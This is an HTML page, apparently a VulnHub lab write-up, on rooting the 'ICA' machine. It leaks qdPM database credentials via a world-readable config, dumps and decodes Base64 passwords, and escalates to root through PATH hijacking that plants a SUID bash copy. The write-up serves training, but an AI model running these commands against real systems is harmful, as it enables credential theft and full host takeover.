@@ -1,0 +1,266 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnhub - ICA</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item active">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>ICA (VulnHub – Easy)</h1>
+
+<p>
+ICA is a straightforward VulnHub machine centered around exploiting a vulnerable qdPM installation to extract
+database credentials, pivoting into SSH access, and escalating privileges through a PATH hijacking vulnerability
+in a SUID binary.  
+The exploitation chain is short but clean, and highlights the importance of secure configuration and safe
+handling of user passwords.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: 10.10.10.10  
+<br>Initial vector: qdPM 9.2 configuration leak → MySQL access → credential extraction  
+<br>Privilege escalation: SUID binary with unsafe PATH → root shell  
+</p>
+
+<h2>Enumeration</h2>
+
+<h3>Port Scan</h3>
+<pre>
+$ nmap -n -v -T4 -Pn -sS -p- -oN all_tcp_port_scan.txt 10.10.10.10
+</pre>
+
+<h3>Service Scan</h3>
+<pre>
+$ nmap -n -v -T4 -Pn -sCV -p22,80,3306,33060 -oN tcp_service_scan.txt 10.10.10.10
+</pre>
+
+<p>
+Port 80 hosts a qdPM instance:
+</p>
+
+<pre>
+qdPM v9.2
+</pre>
+
+<p>
+Searchsploit reveals a known vulnerability:
+</p>
+
+<pre>
+$ searchsploit qdPM
+-> 50176 (Password Exposure)
+</pre>
+
+<h2>Foothold – qdPM Database Leak</h2>
+
+<p>
+qdPM stores database credentials in a world‑readable YAML file:
+</p>
+
+<pre>
+$ curl http://10.10.10.10/core/config/databases.yml
+</pre>
+
+<p>
+Use the recovered credentials to access MySQL:
+</p>
+
+<pre>
+$ mysql -h 10.10.10.10 -u qdpmadmin -p
+</pre>
+
+<p>
+Enumerate the database:
+</p>
+
+<pre>
+mysql> SHOW DATABASES;
+mysql> USE staff;
+mysql> SELECT * FROM user;
+mysql> SELECT * FROM login;
+</pre>
+
+<p>
+The <code>login</code> table contains Base64‑encoded passwords:
+</p>
+
+<pre>
+c3VSSkFkR3dMcDhkeTNyRg==
+N1p3VjRxdGc0MmNtVVhHWA==
+WDdNUWtQM1cyOWZld0hkQw==
+REpjZVZ5OThXMjhZN3dMZw==
+Y3FObkJXQ0J5UzJEdUpTeQ==
+</pre>
+
+<p>
+Decode them:
+</p>
+
+<pre>
+$ for x in $(cat passwords.txt); do echo $x | base64 -d; echo; done
+</pre>
+
+<p>
+One of the decoded credentials belongs to <code>dexter</code>.
+</p>
+
+<h2>Gaining Access</h2>
+
+<pre>
+$ ssh dexter@10.10.10.10
+</pre>
+
+<p>
+User shell obtained.
+</p>
+
+<h2>Privilege Escalation – PATH Hijacking</h2>
+
+<p>
+Search for SUID binaries:
+</p>
+
+<pre>
+$ find / -perm -4000 2>/dev/null > /tmp/SGID.txt
+</pre>
+
+<p>
+A suspicious binary appears:
+</p>
+
+<pre>
+/opt/get_access
+</pre>
+
+<p>
+Inspect it:
+</p>
+
+<pre>
+$ strings /opt/get_access
+</pre>
+
+<p>
+The binary calls <code>cat</code> without an absolute path — a classic PATH hijacking opportunity.
+</p>
+
+<h3>Exploit</h3>
+
+<p>Create a malicious <code>cat</code> in a writable directory:</p>
+
+<pre>
+$ echo -e 'cp /bin/bash /tmp/bash\nchmod 4777 /tmp/bash' > /tmp/cat
+$ chmod +x /tmp/cat
+</pre>
+
+<p>
+Prepend <code>/tmp</code> to PATH:
+</p>
+
+<pre>
+$ export PATH=/tmp:$PATH
+</pre>
+
+<p>
+Execute the vulnerable binary:
+</p>
+
+<pre>
+$ /opt/get_access
+</pre>
+
+<p>
+A SUID bash is created:
+</p>
+
+<pre>
+$ /tmp/bash -p
+# whoami
+root
+</pre>
+
+<h2>Conclusion</h2>
+<p>
+ICA is a clean exploitation chain: qdPM configuration leakage leads to database access, Base64‑encoded passwords
+provide SSH credentials, and a poorly designed SUID binary enables PATH hijacking for full root compromise.  
+A great example of how insecure web app deployments can cascade into complete system takeover.
+</p>
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
